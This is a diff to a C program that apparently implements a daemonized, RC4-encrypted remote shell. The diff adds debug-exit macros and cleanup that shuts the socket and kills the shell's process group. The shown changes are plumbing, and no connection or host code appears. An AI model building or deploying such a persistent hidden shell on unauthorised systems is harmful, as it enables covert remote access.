@@ -51,11 +51,28 @@
         b = t;         \
     }
 
-#define FATAL(msg)               \
-    {                            \
-        if (!DAEMONIZE)          \
-            perror(msg);         \
-        exit(errno ? errno : 1); \
+#define STRINGIZE_DETAIL(x) #x
+#define STRINGIZE(x) STRINGIZE_DETAIL(x)
+#define FATAL(msg)                                             \
+    {                                                          \
+        if (!DAEMONIZE)                                        \
+            perror(__FILE__ ":" STRINGIZE(__LINE__) ": " msg); \
+        exit(errno ? errno : 1);                               \
+    }
+
+#define DEBUG_PROCESS_EXIT(status, msg)                     \
+    {                                                       \
+        if (DAEMONIZE)                                      \
+            break;                                          \
+        if (WIFEXITED(status))                              \
+            fprintf(stderr, msg "with status %d\n",         \
+                    WEXITSTATUS(status));                   \
+        else if (WIFSIGNALED(status))                       \
+            fprintf(stderr, msg "with signal %d\n",         \
+                    WTERMSIG(status));                      \
+        else                                                \
+            fprintf(stderr, msg "with unknown status %d\n", \
+                    status);                                \
     }
 
 typedef struct rc4_state
@@ -119,7 +136,7 @@ int main()
 {
     int pid;
 
-#ifdef DAEMONIZE
+#if DAEMONIZE
     for (int i = 0; i < 2; i++)
     {
         pid = fork();
@@ -140,10 +157,7 @@ int main()
 
         int status;
         waitpid(pid, &status, 0);
-
-#ifndef DAEMONIZE
-        printf("Child exited with status %d\n", status);
-#endif
+        DEBUG_PROCESS_EXIT(status, "Daemon child exited ")
         sleep(1);
     }
 
@@ -277,5 +291,26 @@ int main()
     }
 
 end_loop:
+    // send EOF to the socket
+    shutdown(sockfd, SHUT_WR);
+
+    // SIGTERM entire process group to kill the shell
+    kill(-pid, SIGTERM);
+    for (int i = 0; i < 10; i++)
+    {
+        sleep(1);
+        int status;
+        if (waitpid(-pid, &status, WNOHANG) < 0)
+            continue;
+        DEBUG_PROCESS_EXIT(status, "Shell exited ")
+    }
+
+#if !DAEMONIZE
+    fprintf(stderr, "Shell did not exit, killing\n");
+#endif
+    if (kill(-pid, SIGKILL) < 0)
+        FATAL("kill execl child")
+    close(sockfd);
+    close(master);
     return 0;
 }
